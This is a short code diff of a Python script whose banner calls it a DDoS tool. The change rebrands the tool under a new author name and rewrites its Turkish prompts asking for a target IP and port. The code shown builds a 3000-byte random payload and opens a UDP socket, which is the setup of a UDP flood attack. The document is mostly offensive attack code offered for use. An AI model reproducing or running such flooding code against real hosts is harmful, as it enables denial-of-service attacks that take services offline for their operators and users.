@@ -3,17 +3,17 @@ import random
 import os
 
 os.system("clear")
-banner="""
+kwejnbestoff="""
 ######################################
-#Sinqle DDoS V1.0                    #
-#Coded By SinqleCarboNN Ulaşş        #
+#KwejN DDoS V1.0                     #
+#Coded By KwejN                      #
 ######################################
 
 """
-print(banner)
+print(kwejnbestoff)
 
-hedef_ip=input("hedef ip: ")
-hedef_port=input("hedef port: ")
+hedef_ip=input("IP GIRINIZ: ")
+hedef_port=input("PORT GIRINIZ: ")
 
 bytes=random._urandom(3000)
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
